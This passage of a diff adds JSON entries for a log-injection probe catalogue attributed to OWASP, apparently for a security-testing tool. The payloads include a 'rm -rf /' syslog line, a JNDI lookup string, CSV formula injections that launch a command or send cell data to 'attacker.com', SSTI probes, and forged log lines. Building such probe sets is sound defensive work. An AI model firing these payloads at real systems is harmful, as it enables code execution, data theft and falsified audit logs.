+    "name": "Syslog / PRI header injection (RFC 3164 / RFC 5424) #4",
+    "template": "<134>user=admin cmd=rm -rf /",
+    "description": "Syslog / PRI header injection (RFC 3164 / RFC 5424) probe from OWASP. Tests application handling of: <134>user=admin cmd=rm -rf /",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0084",
+    "name": "Combined / common web log format injection (Apache/Nginx)",
+    "template": "127.0.0.1 - - [01/Jan/2024:00:00:00 +0000] \"GET /x HTTP/1.1\" 200 5",
+    "description": "Combined / common web log format injection (Apache/Nginx) probe from OWASP. Tests application handling of: 127.0.0.1 - - [01/Jan/2024:00:...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0085",
+    "name": "Combined / common web log format injection (Apache/Nginx) #2",
+    "template": "attacker - - \"POST /login HTTP/1.1\" 200 0 \"ref=home\" \"UA=admin\"",
+    "description": "Combined / common web log format injection (Apache/Nginx) probe from OWASP. Tests application handling of: attacker - - \"POST /login HTTP...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0086",
+    "name": "Combined / common web log format injection (Apache/Nginx) #3",
+    "template": "- - [forge] \"GET /admin HTTP/1.1\" 200 -",
+    "description": "Combined / common web log format injection (Apache/Nginx) probe from OWASP. Tests application handling of: - - [forge] \"GET /admin HTTP/1...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0087",
+    "name": "Elasticsearch / Logstash (ELK) injection",
+    "template": "{\"@timestamp\":\"2024-01-01T00:00:00Z\",\"message\":\"injected\"}",
+    "description": "Elasticsearch / Logstash (ELK) injection probe from OWASP. Tests application handling of: {\"@timestamp\":\"2024-01-01T00:0...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0088",
+    "name": "Elasticsearch / Logstash (ELK) injection #2",
+    "template": "{\"message\":\"x\",\"tags\":[\"injected\"]}",
+    "description": "Elasticsearch / Logstash (ELK) injection probe from OWASP. Tests application handling of: {\"message\":\"x\",\"tags\":[\"inject...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0089",
+    "name": "Elasticsearch / Logstash (ELK) injection #3",
+    "template": "{\"message\":\"${jndi:ldap://x/a}\"}",
+    "description": "Elasticsearch / Logstash (ELK) injection probe from OWASP. Tests application handling of: {\"message\":\"${jndi:ldap://x/a}...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0090",
+    "name": "Elasticsearch / Logstash (ELK) injection #4",
+    "template": "{\"@timestamp\":\"1970-01-01\",\"message\":\"backdated event\"}",
+    "description": "Elasticsearch / Logstash (ELK) injection probe from OWASP. Tests application handling of: {\"@timestamp\":\"1970-01-01\",\"me...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0091",
+    "name": "Cloud logging injection (CloudTrail / Cloud Logging style)",
+    "template": "{\"eventName\":\"AssumeRole\",\"userIdentity\":{\"arn\":\"arn:aws:iam::000000000000:user/attacker\"}}",
+    "description": "Cloud logging injection (CloudTrail / Cloud Logging style) probe from OWASP. Tests application handling of: {\"eventName\":\"AssumeRole\",\"use...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0092",
+    "name": "Cloud logging injection (CloudTrail / Cloud Logging style) #2",
+    "template": "{\"insertId\":\"abc\",\"jsonPayload\":{\"message\":\"FORGED\"}}",
+    "description": "Cloud logging injection (CloudTrail / Cloud Logging style) probe from OWASP. Tests application handling of: {\"insertId\":\"abc\",\"jsonPayload...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0093",
+    "name": "Cloud logging injection (CloudTrail / Cloud Logging style) #3",
+    "template": "{\"severity\":\"ERROR\",\"message\":\"injected severity\"}",
+    "description": "Cloud logging injection (CloudTrail / Cloud Logging style) probe from OWASP. Tests application handling of: {\"severity\":\"ERROR\",\"message\":...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0094",
+    "name": "Cloud logging injection (CloudTrail / Cloud Logging style) #4",
+    "template": "{\"resource\":{\"type\":\"gce_instance\"},\"protoPayload\":{\"@type\":\"forged\"}}",
+    "description": "Cloud logging injection (CloudTrail / Cloud Logging style) probe from OWASP. Tests application handling of: {\"resource\":{\"type\":\"gce_insta...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0095",
+    "name": "CSV / exported-log injection (when logs are downloaded as...",
+    "template": "=cmd|'/c calc'!A1",
+    "description": "CSV / exported-log injection (when logs are downloaded as CSV) probe from OWASP. Tests application handling of: =cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0096",
+    "name": "CSV / exported-log injection (when logs are downloaded as CSV) #2",
+    "template": "+cmd|'/c calc'!A1",
+    "description": "CSV / exported-log injection (when logs are downloaded as CSV) probe from OWASP. Tests application handling of: +cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0097",
+    "name": "CSV / exported-log injection (when logs are downloaded as CSV) #3",
+    "template": "-cmd|'/c calc'!A1",
+    "description": "CSV / exported-log injection (when logs are downloaded as CSV) probe from OWASP. Tests application handling of: -cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0098",
+    "name": "CSV / exported-log injection (when logs are downloaded as CSV) #4",
+    "template": "=HYPERLINK(\"http://attacker.com\",\"click\")",
+    "description": "CSV / exported-log injection (when logs are downloaded as CSV) probe from OWASP. Tests application handling of: =HYPERLINK(\"http://attacker.co...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0099",
+    "name": "CSV / exported-log injection (when logs are downloaded as CSV) #5",
+    "template": "=WEBSERVICE(\"http://attacker.com/\"&A1)",
+    "description": "CSV / exported-log injection (when logs are downloaded as CSV) probe from OWASP. Tests application handling of: =WEBSERVICE(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0100",
+    "name": "CSV / exported-log injection (when logs are downloaded as CSV) #6",
+    "template": "@SUM(A1:A10)",
+    "description": "CSV / exported-log injection (when logs are downloaded as CSV) probe from OWASP. Tests application handling of: @SUM(A1:A10)",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0101",
+    "name": "Kubernetes / container log injection",
+    "template": "stdout: {\"log\":\"admin login\\n[FAKE] root granted\"}",
+    "description": "Kubernetes / container log injection probe from OWASP. Tests application handling of: stdout: {\"log\":\"admin login\\n[...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0102",
+    "name": "Kubernetes / container log injection #2",
+    "template": "kubectl logs pod -c app | injected_line",
+    "description": "Kubernetes / container log injection probe from OWASP. Tests application handling of: kubectl logs pod -c app | inje...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0103",
+    "name": "Kubernetes / container log injection #3",
+    "template": "{\"stream\":\"stdout\",\"log\":\"\\n[ALERT] injected\\n\"}",
+    "description": "Kubernetes / container log injection probe from OWASP. Tests application handling of: {\"stream\":\"stdout\",\"log\":\"\\n[A...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0104",
+    "name": "Nginx error_log / access_log format string confusion",
+    "template": "$request_method $request_uri $status",
+    "description": "Nginx error_log / access_log format string confusion probe from OWASP. Tests application handling of: $request_method $request_uri $...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0105",
+    "name": "Nginx error_log / access_log format string confusion #2",
+    "template": "$remote_addr - $http_user_agent",
+    "description": "Nginx error_log / access_log format string confusion probe from OWASP. Tests application handling of: $remote_addr - $http_user_agen...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0106",
+    "name": "Nginx error_log / access_log format string confusion #3",
+    "template": "$host $request $upstream_response_time",
+    "description": "Nginx error_log / access_log format string confusion probe from OWASP. Tests application handling of: $host $request $upstream_respo...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0107",
+    "name": "XML / HTML log export injection (when logs are exported a...",
+    "template": "<logentry user=\"admin\" status=\"ok\"/>",
+    "description": "XML / HTML log export injection (when logs are exported as XML/HTML reports) probe from OWASP. Tests application handling of: <logentry user=\"admin\" status=...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0108",
+    "name": "XML / HTML log export injection (when logs are exported as XML/HTML reports) #2",
+    "template": "<![CDATA[<script>alert(1)</script>]]>",
+    "description": "XML / HTML log export injection (when logs are exported as XML/HTML reports) probe from OWASP. Tests application handling of: <![CDATA[<script>alert(1)</scr...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0109",
+    "name": "XML / HTML log export injection (when logs are exported as XML/HTML reports) #3",
+    "template": "&logentry;",
+    "description": "XML / HTML log export injection (when logs are exported as XML/HTML reports) probe from OWASP. Tests application handling of: &logentry;",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0110",
+    "name": "XML / HTML log export injection (when logs are exported as XML/HTML reports) #4",
+    "template": "<!-- injected comment -->",
+    "description": "XML / HTML log export injection (when logs are exported as XML/HTML reports) probe from OWASP. Tests application handling of: <!-- injected comment -->",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0111",
+    "name": "Timezone / locale log evasion",
+    "template": "[2024-01-01 00:00:00 UTC] event",
+    "description": "Timezone / locale log evasion probe from OWASP. Tests application handling of: [2024-01-01 00:00:00 UTC] even...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0112",
+    "name": "Timezone / locale log evasion #2",
+    "template": "[2024-01-01 00:00:00 +0530] event",
+    "description": "Timezone / locale log evasion probe from OWASP. Tests application handling of: [2024-01-01 00:00:00 +0530] ev...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0113",
+    "name": "Timezone / locale log evasion #3",
+    "template": "[01/Jan/2024:00:00:00] tz=local event",
+    "description": "Timezone / locale log evasion probe from OWASP. Tests application handling of: [01/Jan/2024:00:00:00] tz=loca...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0114",
+    "name": "Timezone / locale log evasion #4",
+    "template": "user=admin TZ=GMT-12 event",
+    "description": "Timezone / locale log evasion probe from OWASP. Tests application handling of: user=admin TZ=GMT-12 event",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0115",
+    "name": "normal line",
+    "template": "// injected admin login",
+    "description": "normal line probe from OWASP. Tests application handling of: // injected admin login",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0116",
+    "name": "normal line #2",
+    "template": "; forged success",
+    "description": "normal line probe from OWASP. Tests application handling of: ; forged success",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0117",
+    "name": "normal line #3",
+    "template": "-- injected entry",
+    "description": "normal line probe from OWASP. Tests application handling of: -- injected entry",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0118",
+    "name": "normal line #4",
+    "template": "/* injected */ user=admin",
+    "description": "normal line probe from OWASP. Tests application handling of: /* injected */ user=admin",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0119",
+    "name": "SSTI in log dashboards (Kibana/Grafana-style template ren...",
+    "template": "{{7*7}}",
+    "description": "SSTI in log dashboards (Kibana/Grafana-style template rendering) probe from OWASP. Tests application handling of: {{7*7}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0120",
+    "name": "SSTI in log dashboards (Kibana/Grafana-style template rendering) #2",
+    "template": "${7*7}",
+    "description": "SSTI in log dashboards (Kibana/Grafana-style template rendering) probe from OWASP. Tests application handling of: ${7*7}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0121",
+    "name": "SSTI in log dashboards (Kibana/Grafana-style template rendering) #3",
+    "template": "<%= 7*7 %>",
+    "description": "SSTI in log dashboards (Kibana/Grafana-style template rendering) probe from OWASP. Tests application handling of: <%= 7*7 %>",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0122",
+    "name": "SSTI in log dashboards (Kibana/Grafana-style template rendering) #4",
+    "template": "#{7*7}",
+    "description": "SSTI in log dashboards (Kibana/Grafana-style template rendering) probe from OWASP. Tests application handling of: #{7*7}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0123",
+    "name": "SSTI in log dashboards (Kibana/Grafana-style template rendering) #5",
+    "template": "{{config.items()}}",
+    "description": "SSTI in log dashboards (Kibana/Grafana-style template rendering) probe from OWASP. Tests application handling of: {{config.items()}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0124",
+    "name": "SSTI in log dashboards (Kibana/Grafana-style template rendering) #6",
+    "template": "{{request.application.__globals__}}",
+    "description": "SSTI in log dashboards (Kibana/Grafana-style template rendering) probe from OWASP. Tests application handling of: {{request.application.__global...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0125",
+    "name": "Base64 / encoded log smuggling",
+    "template": "YWRtaW4gbG9nZ2VkIGlu  (admin logged in)",
+    "description": "Base64 / encoded log smuggling probe from OWASP. Tests application handling of: YWRtaW4gbG9nZ2VkIGlu  (admin l...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0126",
+    "name": "Base64 / encoded log smuggling #2",
+    "template": "eyJ1c2VyIjoiYWRtaW4ifQ==  ({\"user\":\"admin\"})",
+    "description": "Base64 / encoded log smuggling probe from OWASP. Tests application handling of: eyJ1c2VyIjoiYWRtaW4ifQ==  ({\"u...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0127",
+    "name": "Base64 / encoded log smuggling #3",
+    "template": "%59%6e%4a%69%5a%57%46%6e%49%47%39%6b (encoded)",
+    "description": "Base64 / encoded log smuggling probe from OWASP. Tests application handling of: %59%6e%4a%69%5a%57%46%6e%49%47...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0128",
+    "name": "Newline-in-parameter injected via URL-encoded form fields",
+    "template": "username=admin%0a[INFO]+granted",
+    "description": "Newline-in-parameter injected via URL-encoded form fields probe from OWASP. Tests application handling of: username=admin%0a[INFO]+grante...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0129",
+    "name": "Newline-in-parameter injected via URL-encoded form fields #2",
+    "template": "q=test%0d%0a[OK]+admin",
+    "description": "Newline-in-parameter injected via URL-encoded form fields probe from OWASP. Tests application handling of: q=test%0d%0a[OK]+admin",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0130",
+    "name": "Newline-in-parameter injected via URL-encoded form fields #3",
+    "template": "field=a%0Ab=injected",
+    "description": "Newline-in-parameter injected via URL-encoded form fields probe from OWASP. Tests application handling of: field=a%0Ab=injected",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  }
+]
